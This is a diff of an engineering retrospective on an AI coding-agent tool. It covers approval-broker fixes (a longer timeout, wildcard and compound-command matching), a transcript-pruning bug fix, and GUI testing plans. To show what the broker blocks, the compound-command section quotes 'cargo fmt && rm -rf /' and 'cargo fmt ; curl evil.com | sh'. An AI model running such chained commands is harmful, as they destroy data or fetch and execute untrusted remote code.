@@ -120,8 +120,31 @@ While technically successful in delivering working code with 100% test pass rate
 
 ---
 
-## 5. Actionable Recommendations for Gospel
+## 5. Actionable Recommendations & Implemented Fixes
 
-1. **Policy Refinement**: Classify offline, locked read-only commands (`cargo check`, `cargo fmt --check`, `cargo test --locked --offline`) as read-only safe operations under Ask mode.
-2. **Commit Checkpoints**: Add an agent prompt instruction / skill guideline to commit verified milestones to a feature branch rather than leaving multi-thousand-line dirty trees.
-3. **Subagent Orchestration**: Continue leveraging `delegate_exploration`; it was the most effective diagnostic tool in this session and avoided costly guess-and-check loops.
+### 1. Extended Approval Timeout (180 Seconds) — *Implemented*
+- **Previous behavior:** The broker timed out after 60 seconds (`APPROVAL_TIMEOUT = Duration::from_secs(60)`), causing commands to auto-deny if the user was momentarily away or reading the command diff.
+- **Fix:** Increased `APPROVAL_TIMEOUT` to **180 seconds** (`Duration::from_secs(180)`) in `src-tauri/src/approval_broker.rs`. Both backend countdown and frontend cards now give the user a full 3-minute window to review.
+
+### 2. Auto-Approved Wildcard Patterns & Compound Command Security (`&&`, `||`, `;`, `|`) — *Implemented*
+- **Wildcard Matching (`cargo fmt *`):** Enhanced `matches_command_pattern` so that patterns with trailing wildcards (e.g. `cargo fmt *`) cleanly match both bare invocations (`cargo fmt`) and argument forms (`cargo fmt --all`, `cargo fmt -- --check`).
+- **Compound Command Security:** Implemented `split_compound_commands` in `src-tauri/src/approval_broker.rs`. When a command string contains chain or pipe operators (`&&`, `||`, `;`, `|`):
+  - Every subcommand is parsed individually (respecting single and double quotes).
+  - Every subcommand must independently match an allowed rule (`matches_allow_single`).
+  - If *any* subcommand fails to match or triggers a reject rule (e.g. `cargo fmt && rm -rf /` or `cargo fmt ; curl evil.com | sh`), the entire command is blocked from auto-approval.
+
+### 3. Transcript Turn Alignment & Context-Pruning Fix — *Implemented*
+- **Root Cause Identified:** `ConversationStore` caps LLM history at 50 messages / 64 KB (`prune_history_for_storage`). In long, high-tool sessions (like Pockets with 82 edits), earlier turns were drained from model history. When Turn 2 finished, `successful_turn_persistence` blindly recomputed `display_transcript` from the pruned model history, completely erasing Turn 1's user prompt and leaving an orphaned tool block at index 0.
+- **Fix:** Implemented `merge_display_transcripts` in `src-tauri/src/session_turn.rs` and updated `successful_turn_persistence` to accept `existing_display_transcript`. The persistent transcript now preserves all historical user turns across context pruning, filtering out orphaned residue.
+
+### 4. Desktop GUI Testing Strategy for Pockets (GPUI)
+- **Headless Test Context (`TestAppContext`):** GPUI supports headless test contexts via `gpui::TestAppContext` to instantiate the application, create views, dispatch keyboard/click events (`cx.dispatch_action`), and verify state changes without a physical display.
+- **Integration Smoke Harness:** Add a smoke test (`cargo test --test gui_smoke` or `pockets --smoke-test`) that initializes the GPUI `App`, opens the main window, runs one event-loop pump, asserts views rendered without panic, and exits with code 0.
+
+### 5. Enforcing Incremental Modifications (Avoiding Batch Explosions)
+- **Stage Gating:** Large tasks should be split into discrete, test-verified milestones:
+  1. *Milestone 1:* Compiler fixes and baseline test pass.
+  2. *Milestone 2:* Domain logic & persistence modifications.
+  3. *Milestone 3:* UI view models & input handling.
+- **Atomic Commits:** Agents should stage and commit passing milestones to a dedicated feature branch before moving to the next tier of changes.
+
